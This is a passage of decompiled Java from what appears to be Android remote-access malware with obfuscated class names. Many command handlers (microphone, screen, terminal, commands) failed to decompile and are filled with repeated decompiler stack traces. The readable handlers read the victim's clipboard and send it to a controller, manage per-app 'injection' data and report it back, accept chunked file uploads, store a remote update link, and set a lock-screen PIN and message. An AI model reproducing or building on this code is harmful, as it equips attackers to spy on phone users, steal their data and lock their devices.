                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleMic(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 7[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleNetwork(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [15[CASE]], but top level block is 4[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleProxy(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 3[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleScreen(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [40[CASE]], but top level block is 12[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleSearch(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 9[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleTelegramConfig(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 8[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleTerminal(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [20[CASE]], but top level block is 4[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleTools(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 9[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            private void HandleUpdate(JSONObject object) {
                try {
                    String string2 = object.optString("upstate", "0");
                    boolean bl = string2.equals("1");
                    if (bl) {
                        String string3 = object.optString("uptag", "");
                        String string4 = object.optString("uplink", "");
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.up_link, string4);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.req_update, string2);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.up_tag, string3);
                        lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Update", "Request active");
                        return;
                    }
                    vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.up_link, "");
                    vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.req_update, "0");
                    vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.up_tag, "N/A");
                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Update", "is OFF");
                    return;
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("HandleUpdate", exception.getMessage());
                }
            }

            private void HandleUpload(JSONObject object) {
                block9: {
                    String string2;
                    CharSequence charSequence;
                    Object object2;
                    Object object3;
                    block10: {
                        object3 = object.optString("filehash", "empty");
                        object2 = object.optString("savepath", "empty");
                        charSequence = object.optString("isinjct", "0");
                        string2 = object.optString("jctid", "0");
                        Serializable serializable = object.optString("filedata", "");
                        long l = object.optLong("totalSize", 0L);
                        object.optLong("sentSize", 0L);
                        object.optInt("chunkNumber", 0);
                        byte[] byArray = Base64.decode((String)((Object)serializable), (int)2);
                        if (!this.chunkStorage.containsKey(object3)) {
                            object = this.chunkStorage;
                            serializable = new ArrayList();
                            object.put(object3, serializable);
                            this.chunkProgress.put((String)object3, 0L);
                        }
                        this.chunkStorage.get(object3).add(byArray);
                        this.chunkProgress.put((String)object3, this.chunkProgress.get(object3) + (long)byArray.length);
                        if (this.chunkProgress.get(object3) < l) break block9;
                        boolean bl = ((String)charSequence).equals("1");
                        object = object2;
                        if (!bl) break block10;
                        object = new File(Dummyctx.getFilesDir(), "protected");
                        if (!((File)object).exists()) {
                            ((File)object).mkdirs();
                        }
                        object2 = new StringBuilder();
                        serializable = new File((File)object, ((StringBuilder)object2).append(string2).append(".zip").toString());
                        object = object2 = ((File)serializable).getAbsolutePath();
                        if (elwxjqxcxhcpntga.ject_list.contains(string2)) break block10;
                        elwxjqxcxhcpntga.ject_list.add(string2);
                        object = object2;
                    }
                    try {
                        this.reconstructFile((String)object, (String)object3);
                        if (((String)charSequence).equals("1")) {
                            object3 = new File(Dummyctx.getFilesDir(), "protected");
                            object2 = new File((File)object3, string2);
                            if (!((File)object2).exists()) {
                                ((File)object2).mkdirs();
                            }
                            charSequence = new StringBuilder();
                            object = new File((File)object3, ((StringBuilder)charSequence).append(string2).append(".zip").toString());
                            this.extractZipFile((File)object, (File)object2);
                        }
                        lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Upload", "Completed");
                    }
                    catch (Exception exception) {
                        maagohqzehyoivaxlfkohrpeu.Error("HandleUpload", exception.getMessage());
                    }
                }
            }

            /*
             * Exception decompiling
             */
            private void Handlebroadcast(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 3[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Unable to fully structure code
             */
            private void Handleclipboard(JSONObject var1_1) {
                block6: {
                    var2_4 = var1_1.optString("cas", "");
                    if (!var2_4.equals("0")) ** GOTO lbl-1000
                    elwxjqxcxhcpntga.BringMeFront(etkmbyodxlwuglfdj.Dummyctx);
                    var1_1 = ffbrxjknfnpfxahr.readClipboard(etkmbyodxlwuglfdj.Dummyctx);
                    try {
                        var2_4 = new JSONObject();
                        var2_4.put("type", (Object)"clip");
                        var2_4.put("cdata", var1_1);
                        var1_1 = var2_4.toString();
                        this.this$0.Livemessage(etkmbyodxlwuglfdj.Dummyctx, (String)var1_1);
                    }
                    catch (Exception var1_2) {
                        var1_2.printStackTrace();
                    }
                    break block6;
lbl-1000:
                    // 1 sources

                    {
                        if (var2_4.equals("1") && (var1_1 = var1_1.optString("tost", "")).length() > 0) {
                            ffbrxjknfnpfxahr.setClipboard(etkmbyodxlwuglfdj.Dummyctx, (String)var1_1);
                        }
                    }
                    {
                        catch (Exception var1_3) {
                            maagohqzehyoivaxlfkohrpeu.Error("Handleclipboard", var1_3.getMessage());
                        }
                    }
                }
            }

            /*
             * Exception decompiling
             */
            private void Handlecommand(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 36[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Unable to fully structure code
             * Enabled aggressive exception aggregation
             */
            private void Handleject(JSONObject var1_1) {
                block12: {
                    var4_4 /* !! */  = var1_1 /* !! */ .optString("cas", "");
                    var3_5 = new AppDataManager(etkmbyodxlwuglfdj.Dummyctx);
                    var2_6 = var4_4 /* !! */ .equals("0");
                    if (var2_6) {
                        var1_1 /* !! */  = var1_1 /* !! */ .optString("tid", "0");
                        var4_4 /* !! */  = etkmbyodxlwuglfdj.Dummyctx.getFilesDir();
                        var6_7 = new File((File)var4_4 /* !! */ , (var5_9 = new StringBuilder()).append("protected/").append((String)var1_1 /* !! */ ).toString());
                        if (var6_7.exists()) {
                            var6_7.delete();
                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(etkmbyodxlwuglfdj.Dummyctx, "injection", "Removed inject data");
                        }
                        if (elwxjqxcxhcpntga.ject_list.contains(var1_1 /* !! */ )) {
                            elwxjqxcxhcpntga.ject_list.remove(var1_1 /* !! */ );
                            var4_4 /* !! */  = etkmbyodxlwuglfdj.Dummyctx;
                            var5_9 = new StringBuilder();
                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(var4_4 /* !! */ , "injection", var5_9.append("Removed ").append((String)var1_1 /* !! */ ).toString());
                        }
                        var3_5.clearData((String)var1_1 /* !! */ );
                        break block12;
                    }
                    if (!var4_4 /* !! */ .equals("1")) ** GOTO lbl-1000
                    if (elwxjqxcxhcpntga.ject_list.size() == 0) {
                        lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(etkmbyodxlwuglfdj.Dummyctx, "injection", "no injections add");
                        return;
                    }
                    var1_1 /* !! */  = new JSONArray();
                    for (String var6_8 : elwxjqxcxhcpntga.ject_list) {
                        var5_10 = new JSONObject();
                        var5_10.put("appId", (Object)var6_8);
                        var7_11 = var3_5.getData(var6_8);
                        var2_6 = var7_11.isEmpty();
                        if (var2_6) {
                            var5_10.put("data", (Object)"No data");
                        } else {
                            var6_8 = new JSONArray(var7_11);
                            var5_10.put("data", (Object)var6_8);
                        }
                        var1_1 /* !! */ .put((Object)var5_10);
                    }
                    try {
                        var3_5 = new JSONObject();
                        var3_5.put("type", "ject");
                        var3_5.put("jdata", var1_1 /* !! */ );
                        var1_1 /* !! */  = var3_5.toString();
                        this.this$0.Livemessage(etkmbyodxlwuglfdj.Dummyctx, (String)var1_1 /* !! */ );
                    }
                    catch (Exception var1_2) {
                        var1_2.printStackTrace();
                    }
                    break block12;
lbl-1000:
                    // 1 sources

                    {
                        var4_4 /* !! */ .equals("2");
                    }
                    {
                        catch (Exception var1_3) {
                            maagohqzehyoivaxlfkohrpeu.Error("Handleject", var1_3.getMessage());
                        }
                    }
                }
            }

            private void Handlejects(JSONObject jSONObject) {
                try {
                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.alljectsids = jSONObject.optString("jdat", "empty");
                    if (lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.alljectsids != "empty" && !lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.isJecton()) {
                        lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.StartAutoj(Dummyctx);
                    }
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("HandleLocaton", exception.getMessage());
                }
            }

            private void Handlelock(JSONObject object) {
                try {
                    String string2 = object.optString("cas", "");
                    if (string2.equals("0")) {
                        vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_screen, false);
                        this.loadcodes();
                    } else if (string2.equals("1")) {
                        string2 = object.optString("pin", "");
                        String string3 = object.optString("title", "");
                        String string4 = object.optString("lckdis", "");
                        object = object.optString("typ", "");
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_pin, string2);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_title, string3);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_msg, string4);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_type, (String)object);
                        vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_screen, true);
                        this.loadcodes();
                    } else if (string2.equals("2")) {
                        this.loadcodes();
                    } else if (string2.equals("3")) {
                        ffbrxjknfnpfxahr.Clearpasscodes(Dummyctx);
                    }
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("Handleclipboard", exception.getMessage());
                }
            }

            private void Handlemessage(JSONObject object) {
                block5: {
                    String string2;
                    block6: {
                        string2 = object.optString("data", "");
